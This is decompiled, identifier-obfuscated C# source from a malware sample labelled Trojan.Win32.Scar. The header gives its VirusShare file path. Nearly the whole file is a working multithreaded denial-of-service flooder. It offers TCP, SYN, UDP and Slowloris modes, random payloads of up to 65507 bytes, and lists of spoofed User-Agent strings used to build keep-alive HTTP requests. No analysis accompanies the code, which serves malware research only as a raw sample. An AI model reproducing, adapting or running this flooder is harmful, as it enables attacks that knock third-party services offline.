// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.ഩᠲᖤᄙɬÖኤ๴ᛄ໇
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  internal class ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7
  {
    private static ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ \u0483̌ᯖѣ\u18AB\u1CA6ҝධ᳙įᤎᆁᑼྡྷᨂᑓᎪ\u1AC8;
    private static bool ҳȣBԐ๒\u0008ᴔ;
    private static string ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ;
    private static int ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ;
    private static int ᏔᤪцᴼඈѠ;
    private static int ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ;
    private static int ܟۏṐ\u08C9\u0F6D᧑ᰪᇋทူᇿᛙՌᧆႆᖗᶻඎኦ;
    private static ᬩ\u0E76ᎈÁጹʋ ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ;
    private static string[] \u1CD0ᯅݛỆéӐᳩᢹ = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };
    private static string[] ᗘᰮᅶᇁඇፆជᤧ\u00A4ᚋਤݹᩔࣤᣌů\u0E72\u1BFA = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };

    public static ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ آᅞډᷦዌ୩པઽᄕ\u00AEᔩ => ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0483̌ᯖѣ\u18AB\u1CA6ҝධ᳙įᤎᆁᑼྡྷᨂᑓᎪ\u1AC8;

    public static string ງறᩇᵁ߲\u005EِҦ\u1940ચఃǛᯈ\u128FٝĆ\u0ABAፀ\u1363
    {
      get
      {
        switch (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0483̌ᯖѣ\u18AB\u1CA6ҝධ᳙įᤎᆁᑼྡྷᨂᑓᎪ\u1AC8)
        {
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.ᇮƓᑤቼՉɳጾḵʀዦාᵜᆷࠖ\u00B8ᝎ:
            return "TCP";
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.\u09C2Ṑ੍ᶤ᧐ᥴħତยࠜሑŌ\u0B31ोڂӣ:
            return "SYN";
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.ਐᪧౌ႔ە\u1AAFጯᑨၻذ\u0899\u0FEB\u000F٢:
            return "UDP";
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.รᙢᔚጾᆃ\u1A7E\u175DݞፁݝᙧᦗĲ᳭ᚎ:
            return "Slowloris";
          default:
            return (string) null;
        }
      }
    }

    public static bool \u0CBBኣ\u19F6\u08CAᢂ => ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ;

    public static void ৠ\u0013ࢬດݎৡαशÐᙡ(
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ _param0,
      string _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5,
      ᬩ\u0E76ᎈÁጹʋ _param6)
    {
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0483̌ᯖѣ\u18AB\u1CA6ҝධ᳙įᤎᆁᑼྡྷᨂᑓᎪ\u1AC8 = _param0;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ = _param1;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ = _param2;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᏔᤪцᴼඈѠ = _param3;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ܟۏṐ\u08C9\u0F6D᧑ᰪᇋทူᇿᛙՌᧆႆᖗᶻඎኦ = _param4;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ = _param5;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ = _param6;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ = false;
    }

    public static void ᄨ\u00BEᤶ\u0FE7༡᱉ᎃᦨచᤓˡḶ\u003A\u1878Ԁᥙ()
    {
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ = true;
      new Thread(new ThreadStart(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.չ\u10C9ਬẇɩેჳᐃᵞࠨଉࠓပ)).Start();
    }

    public static void ᜧ᪗֜ളᇡᶕ\u0E73ḳᩞḪୟຣЋं\u0992ΈûႲԊ() => ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ = false;

    private static void չ\u10C9ਬẇɩેჳᐃᵞࠨଉࠓပ()
    {
      for (int index = 0; index < ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᏔᤪцᴼඈѠ; ++index)
      {
        try
        {
          new Thread(new ThreadStart(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᢀᰰÈ\u1735Ԋਤ̭\u16FA\u0AFC))
          {
            IsBackground = true
          }.Start();
        }
        catch (OutOfMemoryException ex)
        {
          ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᏔᤪцᴼඈѠ = index - 1;
          break;
        }
      }
    }

    private static void ᢀᰰÈ\u1735Ԋਤ̭\u16FA\u0AFC()
    {
      int num = 0;
      while (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ && ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ.\u0F6Fǀ̋ṙٛުፂ\u1AC3ᜤ)
      {
        switch (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0483̌ᯖѣ\u18AB\u1CA6ҝධ᳙įᤎᆁᑼྡྷᨂᑓᎪ\u1AC8)
        {
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.ᇮƓᑤቼՉɳጾḵʀዦාᵜᆷࠖ\u00B8ᝎ:
            Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket1.Blocking = false;
            while (num < ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ܟۏṐ\u08C9\u0F6D᧑ᰪᇋทူᇿᛙՌᧆႆᖗᶻඎኦ && ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ)
            {
              if (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ.\u0F6Fǀ̋ṙٛުፂ\u1AC3ᜤ)
              {
                try
                {
                  socket1.Connect(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ);
                  socket1.Send(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ࠚौ\u0C3Apםʨ͈ɞᷢʑ೦\u0D51ᵝᬘ\u0D50());
                  socket1.Close();
                  socket1 = (Socket) null;
                }
                catch
                {
                  socket1.Close();
                  break;
                }
                ++num;
                Thread.Sleep(1);
              }
              else
                break;
            }
            Thread.Sleep(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ);
            break;
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.\u09C2Ṑ੍ᶤ᧐ᥴħତยࠜሑŌ\u0B31ोڂӣ:
            Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket2.Blocking = false;
            try
            {
              socket2.BeginConnect(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ, new AsyncCallback(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ऩρر\u1B75ૣᄎᦥݺᢇᇔࠨ\u08E0ᶈἷ\u0083᪆ߵ͍Ʋ), (object) null);
            }
            catch
            {
            }
            Thread.Sleep(100);
            try
            {
              if (socket2.Connected)
                socket2.Disconnect(false);
              socket2.Close();
            }
            catch
            {
            }
            Thread.Sleep(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ);
            break;
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.ਐᪧౌ႔ە\u1AAFጯᑨၻذ\u0899\u0FEB\u000F٢:
            Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket3.Blocking = false;
            Socket socket4;
            try
            {
              socket3.Connect(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ);
              while (num < ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ܟۏṐ\u08C9\u0F6D᧑ᰪᇋทူᇿᛙՌᧆႆᖗᶻඎኦ && ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ && ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ.\u0F6Fǀ̋ṙٛުፂ\u1AC3ᜤ)
              {
                socket3.Send(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᘊᗶᗑ\u177Bშᴿ෮᪆\u0021ዐ০ᡏᩯ());
                ++num;
                Thread.Sleep(1);
              }
              socket3.Close();
              socket4 = (Socket) null;
            }
            catch
            {
              socket3.Close();
              socket4 = (Socket) null;
              break;
            }
            Thread.Sleep(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ);
            break;
          case ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ.รᙢᔚጾᆃ\u1A7E\u175DݞፁݝᙧᦗĲ᳭ᚎ:
            Socket socket5 = (Socket) null;
            try
            {
              socket5 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socket5.Connect(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ຜᱽฝᓶԳܸ\u1878ḄυցឧḹṮ);
              socket5.Send(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0A80ᵏᧂൟఠ\u0CDBᐖྃᱩ\u0FFCēᣴ());
              while (socket5.Connected)
              {
                if (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ)
                {
                  if (ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓽỦ\u0BBAᕱ\u0F3Dข\u0B645ᓕಬౣש\u18FAᵞ.\u0F6Fǀ̋ṙٛުፂ\u1AC3ᜤ)
                  {
                    socket5.Send(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u0A80ᵏᧂൟఠ\u0CDBᐖྃᱩ\u0FFCēᣴ());
                    Thread.Sleep(2000);
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            catch
            {
              socket5.Close();
            }
            Thread.Sleep(ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ဠ\u0EF3᪶ƻཱུޑೂ\u0897ᏇᚾైḈঞᘃݵፆઋ);
            break;
        }
        num = 0;
      }
      if (!ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ҳȣBԐ๒\u0008ᴔ)
        return;
      ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᜧ᪗֜ളᇡᶕ\u0E73ḳᩞḪୟຣЋं\u0992ΈûႲԊ();
    }

    private static void ऩρر\u1B75ૣᄎᦥݺᢇᇔࠨ\u08E0ᶈἷ\u0083᪆ߵ͍Ʋ(IAsyncResult _param0)
    {
    }

    private static byte[] ᘊᗶᗑ\u177Bშᴿ෮᪆\u0021ዐ০ᡏᩯ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] ࠚौ\u0C3Apםʨ͈ɞᷢʑ೦\u0D51ᵝᬘ\u0D50()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] \u0A80ᵏᧂൟఠ\u0CDBᐖྃᱩ\u0FFCēᣴ()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᓩሹᬣჺᆂӄ௩ᬚ͈ࠏᓡ);
      stringBuilder.AppendLine("User-Agent: " + ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᗘᰮᅶᇁඇፆជᤧ\u00A4ᚋਤݹᩔࣤᣌů\u0E72\u1BFA[random.Next(0, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.ᗘᰮᅶᇁඇፆជᤧ\u00A4ᚋਤݹᩔࣤᣌů\u0E72\u1BFA.Length - 1)] + " " + ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u1CD0ᯅݛỆéӐᳩᢹ[random.Next(0, ഩᠲᖤᄙɬÖኤ\u0E74ᛄ\u0EC7.\u1CD0ᯅݛỆéӐᳩᢹ.Length - 1)]);
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }

    public enum Űϑచᴞܮ፝ዶᤑᙤงᇂ\u0E74ᝓر༨Ộ\u124Fᯋ
    {
      ᇮƓᑤቼՉɳጾḵʀዦාᵜᆷࠖ\u00B8ᝎ,
      \u09C2Ṑ੍ᶤ᧐ᥴħତยࠜሑŌ\u0B31ोڂӣ,
      ਐᪧౌ႔ە\u1AAFጯᑨၻذ\u0899\u0FEB\u000F٢,
      รᙢᔚጾᆃ\u1A7E\u175DݞፁݝᙧᦗĲ᳭ᚎ,
    }
  }
}
